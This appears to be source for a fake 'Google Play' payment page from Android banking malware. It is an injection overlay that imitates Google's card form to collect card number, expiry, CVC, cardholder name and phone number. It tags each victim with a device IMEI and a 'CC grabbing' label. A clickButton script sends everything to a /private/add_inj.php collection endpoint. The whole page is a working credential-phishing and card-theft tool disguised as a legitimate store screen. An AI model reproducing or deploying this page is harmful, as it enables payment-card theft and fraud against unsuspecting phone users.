<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
	<title>Google Play</title>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="stylesheet" type="text/css" href="css/style.css"/>
	<link rel="stylesheet" type="text/css" href="css/mobipick.css" />
	<link rel="stylesheet" type="text/css" href="css/jquery.mobile-1.3.0.min.css" />
	
	<link rel="stylesheet"href="css/bootstrap.css"type="text/css"media="all"/>
</head>
<body>
<?php
	//    $IM = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
	
	//	$masС = explode("|", $IM);

	//	$country = $masС[1];

		//$country = htmlspecialchars($_REQUEST["c"], ENT_QUOTES);
	//	$IM = "869073026507878";
	//	$country = "us";
		//$IMEI = "$IM|$country|Грабинг СС";
?>

<?php 
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|ru";
$vid_inj = "grabing_mini";
$nameBank = "Грабинг СС mini";
$IM = "$IMEI_country|$vid_inj|$nameBank";
?>


<div class="wrapper">
	<div class="content">
		<p class="text-title"></p>
		<div class="credit-card-group">

			<form id="mf" method="post">
			
				<p class="cards_icons">
				
					<img src="images/mdpi/visa.png" id="img_card_visa" class="img_cards" />
					<img src="images/mdpi/mastercard.png" id="img_card_mastercard" 
						class="img_cards" />
					<img src="images/mdpi/amex.png" id="img_card_amex" class="img_cards" />
					<img src="images/mdpi/diners.png" id="img_card_diners" class="img_cards" />
					<img src="images/mdpi/discover.png" id="img_card_discover" class="img_cards" />
					<img src="images/mdpi/jcb.png" id="img_card_jcb" class="img_cards" />
				</p>
				
				
				<div class="error_image" id="card-number-error"></div>
				<input data-role="none" type="tel" id="cardNumber" name="cardNumber" class="card-number"/>
				<div class="month-year-cvc-block">

					<div class="error_image" id="card-expiration-error"></div>
					<input data-role="none" type="tel" id="cardExp" name="cardExpiration" class="card-expiration"/>

					
					<div class="cvc-block">
						<div class="error_image" id="card-cvc-error"></div>
						<img src="images/mdpi/cvc_hint_default.png" class="cvc-hint">
						<input data-role="none" type="tel" onClick="$('.cvc-hint').show(); getData();" 
							id="cvcEntry" name="cvcEntry" class="card-cvc" placeholder="CVC"/>
					</div>
			
				</div>
				
				</br></br>
			</form>
			

			<form id="address-fields-block">
				<div class="error_image" id="card-holder-error"></div>
				<input data-role="none" type="text" id="nameOnCard"name="nameOnCard" maxlength="50" class="card-holder"/>
				
				
				<div class="error_image" id="phone-prefix-error"></div>
				<strong>+</strong>
				<input data-role="none" type="tel" pattern="[0-9]*" id="phone_prefix" 
					name="phonePrefix" class="phone-prefix" placeholder="1"/>
					
				<div class="error_image" id="phone-number-error"></div>
				<input data-role="none" type="tel" pattern="[0-9]*" id="phone_number" class="phone-number" name="phoneNumber"/>
					<p class="text-agreement"></p>
				
				
			</form>
			<form id="card-vbv-block">
			
				<input data-role="page" type="text" pattern="[0-9]*" name="dateOfBirth"
					min="1956-01-01" max="2000-12-31"
					class="date-birth"/>
			</form>
			
			<div class="button-bar">
			
			</br>
			<img src="images/mdpi/logo_googleplay.png" class="logo_googleplay">
			<input data-role="none" type="button" disabled class="save-button" onclick="clickButton()"/>
			</div>


		</div>
	</div>
</div>

<form id="mff">
<?php
echo "<input data-role='none' type='text' id='imei_c' name='imei' value='$IM' class='imei' style='visibility:hidden'/>";
?>
</form>

<script type="text/javascript" src="js/jquery-1.12.0.min.js"></script>
<script type="text/javascript" src="js/jquery.mobile-1.3.0.min.js"></script>
<script type="text/javascript" src="js/jquery.mask.min.js"></script>
<script type="text/javascript" src="js/xdate.js"></script>
<script type="text/javascript" src="js/xdate.i18n.js"></script>
<script type="text/javascript" src="js/cards.i18n.js"></script>
<script type="text/javascript" src="js/mobipick.js"></script>
<script type="text/javascript" src="js/cat.functions.js"></script>
<script type="text/javascript" src="js/functions.mini.js"></script>
<script type="text/javascript">
	
	function clickButton()
	{
		var imei_c = document.forms["mff"].elements["imei_c"].value; 
		var cardNumber = document.forms["mf"].elements["cardNumber"].value; 
		var cardExp = document.forms["mf"].elements["cardExpiration"].value; 
		var cvcEntry = document.forms["mf"].elements["cvcEntry"].value; 
		var nameOnCard = document.forms["address-fields-block"].elements["nameOnCard"].value; 
		var phone_prefix = document.forms["address-fields-block"].elements["phone_prefix"].value; 
		var phone_number = document.forms["address-fields-block"].elements["phone_number"].value; 
		

		location.replace('/private/add_inj.php?p=' + imei_c+"|"+cardNumber+"|"+cardExp+"|"+cvcEntry+"|"+nameOnCard+"|"+phone_prefix+phone_number);
	
	}
	
	var botCountry = getCountryCode().toLowerCase();
	var botLanguage = getLanguageCode().toLowerCase();
	
	function getLanguageAttr(classElem) {
		for (var arrItem in cardLocalesAttr)
			for (var element in cardLocalesAttr[arrItem])
				if (cardLocalesAttr[arrItem][element] == classElem)
					return arrItem;
		return 'val';
	}
	
	$.fn.exists = function() {
		return $(this).length;
	}
	
	$(document).bind('mobileinit',function(){
		$.mobile.pushStateEnabled = false;
	});
	
	$( document ).ready( function() {
	
		if (botCountry != 'us') {
			$('#img_card_diners').remove();
			$('#img_card_discover').remove();
			if (botCountry != 'jp') {
				$('#img_card_jcb').remove();
			}
		}
		
		var Language;
		if (cardLocales[botLanguage + '-' + botCountry] != undefined)
			Language = cardLocales[botLanguage + '-' + botCountry];
		else if (cardLocales[botLanguage] != undefined)
			Language = cardLocales[botLanguage];
		else
			Language = cardLocales['en-gb'];
		
		for (var classElem in Language) {
			var type = getLanguageAttr(classElem);
			var text = Language[classElem];
			if (type == 'value')
				$('.' + classElem).val(text);
			else if (type == 'html')
				$('.' + classElem).html(text);
			else if (type == 'placeholder')
				$('.' + classElem).attr('placeholder', text);
		}
	});
	
	$( document ).on( "pagecreate", "#address-fields-block", function() {
		
		var picker = $( ".date-birth", this );
		
		picker.mobipick({
			locale: botCountry,	dateFormat: "dd.MM.yyyy"
		});

		picker.on( "change", function() {
			var date = $( this ).val();			
			var dateObject = $( this ).mobipick( "option", "date" );
		});
	});


</script>
</script>
</body>
</html>